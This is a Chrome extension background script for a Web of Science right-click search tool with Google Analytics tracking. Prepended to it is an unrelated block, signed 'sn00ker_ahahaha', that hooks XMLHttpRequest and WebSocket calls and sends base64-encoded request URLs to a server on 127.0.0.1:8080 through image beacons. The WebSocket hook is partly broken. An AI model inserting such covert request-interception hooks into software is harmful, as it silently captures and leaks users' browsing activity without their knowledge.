function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
// Standard Google Universal Analytics code
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

	ga('create', 'UA-104701984-1', 'auto');
	ga('set', 'checkProtocolTask', function(){}); // Removes failing protocol check. @see: http://stackoverflow.com/a/22152353/1958200
	ga('require', 'displayfeatures');
// end ga code block

// start code block for right click to search
chrome.runtime.onInstalled.addListener(function() {
  var context = "selection";
  var title = chrome.i18n.getMessage('contextLabel');
  var id = chrome.contextMenus.create({"title": title, "contexts":[context], "id": "context" + context});
});
chrome.contextMenus.onClicked.addListener(onClickHandler);
  // The onClicked callback function.
  function onClickHandler(info, tab) {
	var sText = info.selectionText;
	//Selected text is scrubbed of the following characters, which otherwise cause the right-click search to fail: = , " , ( , ) , “ , ”
	sText = sText.replace(/[="()“”]/g,'');
	var restoreSearch;
	var url;
  chrome.storage.sync.get('restoreSearch', function(localdatastore) {
		restoreSearch = JSON.stringify(localdatastore.restoreSearch);
		if (restoreSearch == null || restoreSearch == '"search1"') {
			url = "http://gateway.isiknowledge.com/gateway/Gateway.cgi?GWVersion=2&SrcApp=ChromeWebApp&SrcAuth=Clarivate&DestApp=UA&DestLinkType=GeneralSearchSummary&topic="+ encodeURIComponent(sText) +"&btnWS=Search";
      trackOutboundLink(url,sText);
		} else {
			url = "http://gateway.isiknowledge.com/gateway/Gateway.cgi?GWVersion=2&SrcApp=ChromeWebApp&SrcAuth=Clarivate&DestApp=WOS&DestLinkType=GeneralSearchSummary&topic="+ encodeURIComponent(sText) +"&btnWS=Search";
      trackOutboundLink(url,sText);
		}
	});
};
  // external link tracker function
  var trackOutboundLink = function(url,sText) {
    ga('send', 'event', 'right-click search', 'search', sText, {
      'transport': 'beacon',
      'hitCallback': function(){window.open(url, '_blank');}
    });
  }
// end of external link tracker function

// Background page ga view/event message listener from extension pages or content scripts
chrome.runtime.onMessage.addListener(
  function(request, sender, sendResponse) {
  //   if (request.foundid == "UT") {
	// 	sendResponse({logmsg: "GA event logged."});
	// 	ga('send', 'event', 'UT found on page', 'lookup');
	//  }
	//   if (request.foundid == "doi") 	{
	// 	sendResponse({logmsg: "GA event logged."});
	// 	ga('send', 'event', 'DOI found on page', 'lookup');
	// }
	if (request.pageview == "popup.html") 	{
    ga('send', 'pageview', '/popup.html');
    sendResponse({logmsg: "GA event logged: pageview for /popup.html"});
	}
	if (request.pageview == "options.html") 	{
    ga('send', 'pageview', '/options.html');
    sendResponse({logmsg: "GA event logged: pageview for /options.html."});
	}
  });
// end ga message listener
